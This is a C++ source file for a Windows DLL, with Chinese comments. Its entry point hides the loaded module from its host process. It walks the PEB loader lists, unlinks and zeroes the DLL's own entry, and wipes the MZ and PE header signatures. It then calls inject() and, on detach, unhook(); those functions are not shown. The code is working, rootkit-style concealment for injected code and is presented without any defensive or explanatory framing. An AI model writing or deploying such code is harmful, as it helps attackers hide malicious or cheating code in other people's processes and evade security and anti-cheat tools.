// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"

void inject();
void unhook();

void FuckLDR() {

	DWORD pLDR;
	PLIST_ENTRY _start_address;
	DWORD BaseAddress;
	_asm {
		mov eax, fs:[0x30];
		mov eax, [eax + 0xc];
		mov eax, [eax + 0xc];
		mov _start_address, eax;
		call s;
	s:	pop eax;
	
	loop1:	
		cmp word ptr[eax], 'ZM';
		je ed;
		dec eax;
		jmp loop1;
	ed:	
		mov BaseAddress, eax;
	}
	//memcpy((LPVOID)0x140e000, &BaseAddress, 4);
	PLIST_ENTRY list_entry = _start_address;
	//LDR断链
	do{
		
		if (*(DWORD *)((DWORD)list_entry + 0x18) == BaseAddress) {

			LPVOID clearaddress = (LPVOID)list_entry;

			list_entry->Flink->Blink = list_entry->Blink;
			list_entry->Blink->Flink = list_entry->Flink;

			list_entry = (PLIST_ENTRY)((DWORD)list_entry + 8);

			list_entry->Flink->Blink = list_entry->Blink;
			list_entry->Blink->Flink = list_entry->Flink;

			list_entry = (PLIST_ENTRY)((DWORD)list_entry + 8);

			list_entry->Flink->Blink = list_entry->Blink;
			list_entry->Blink->Flink = list_entry->Flink;

			memset(clearaddress, 0, 0x30);

			//memcpy((LPVOID)0x140e000, &BaseAddress, 4);

			break;
		}
		list_entry = list_entry->Blink;
	} while (list_entry != _start_address);
		
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)BaseAddress;
	PIMAGE_NT_HEADERS32 pinh = (PIMAGE_NT_HEADERS32)(BaseAddress + pidh->e_lfanew);

	DWORD old;

	VirtualProtect((LPVOID)BaseAddress, pinh->OptionalHeader.SizeOfHeaders, PAGE_EXECUTE_READWRITE, &old);

	//抹除PE标记
	memcpy((LPVOID)BaseAddress, "\x00\x00", 2);
	memcpy((LPVOID)(BaseAddress + pidh->e_lfanew), "\x00\x00", 2);

	VirtualProtect((LPVOID)BaseAddress, pinh->OptionalHeader.SizeOfHeaders, old, &old);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		FuckLDR();
		inject();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
		unhook();
        break;
    }
    return TRUE;
}

